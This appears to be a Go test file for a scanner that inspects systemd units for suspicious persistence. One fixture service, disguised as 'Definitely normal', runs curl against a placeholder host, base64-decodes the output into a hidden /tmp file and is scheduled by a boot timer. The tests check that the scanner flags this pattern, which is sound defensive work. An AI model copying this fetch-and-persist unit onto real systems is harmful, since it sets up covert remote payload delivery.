package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScanDetectsHighRiskExecutionAndTimer(t *testing.T) {
	root := t.TempDir()
	unitDir := filepath.Join(root, "etc", "systemd", "system")
	if err := os.MkdirAll(unitDir, 0755); err != nil {
		t.Fatal(err)
	}
	service := `[Unit]
Description=Definitely normal
[Service]
ExecStart=/bin/bash -c "curl https://example.invalid/p | base64 -d > /tmp/.x"
Restart=always
[Install]
WantedBy=multi-user.target
`
	if err := os.WriteFile(filepath.Join(unitDir, "example.service"), []byte(service), 0644); err != nil {
		t.Fatal(err)
	}
	timer := `[Timer]
OnBootSec=2min
Persistent=true
Unit=example.service
`
	if err := os.WriteFile(filepath.Join(unitDir, "example.timer"), []byte(timer), 0644); err != nil {
		t.Fatal(err)
	}

	result := scan(scanOptions{Root: root, UseSystemctl: false})
	if result.FilesScanned != 2 {
		t.Fatalf("FilesScanned=%d, want 2", result.FilesScanned)
	}
	wanted := []string{"risky writable location", "network transfer tool", "shell command", "encoded or inline code", "scheduled execution"}
	for _, phrase := range wanted {
		if !hasTitle(result.Findings, phrase) {
			t.Errorf("missing finding containing %q; got %#v", phrase, titles(result.Findings))
		}
	}
}

func TestParseDirectivesJoinsContinuationLines(t *testing.T) {
	directives := parseDirectives("[Service]\nExecStart=/bin/sh \\\n+  -c 'echo hello'\n")
	if len(directives) != 1 {
		t.Fatalf("got %d directives, want 1", len(directives))
	}
	if directives[0].Line != 2 || !strings.Contains(directives[0].Value, "echo hello") {
		t.Fatalf("unexpected directive: %#v", directives[0])
	}
}

func TestSortFindingsPlacesHighestRiskFirst(t *testing.T) {
	items := []Finding{
		newFinding("Services", SeverityReview, 25, "low", "a.service", "", 0, "", ""),
		newFinding("Execution", SeveritySuspicious, 90, "high", "b.service", "", 0, "", ""),
	}
	filtered := filterFindings(items, "", SeverityInfo)
	sortFindings(filtered)
	if filtered[0].Title != "high" {
		t.Fatalf("first finding=%q, want high", filtered[0].Title)
	}
}

func hasTitle(findings []Finding, phrase string) bool {
	for _, finding := range findings {
		if strings.Contains(strings.ToLower(finding.Title), strings.ToLower(phrase)) {
			return true
		}
	}
	return false
}

func titles(findings []Finding) []string {
	values := make([]string, 0, len(findings))
	for _, finding := range findings {
		values = append(values, finding.Title)
	}
	return values
}
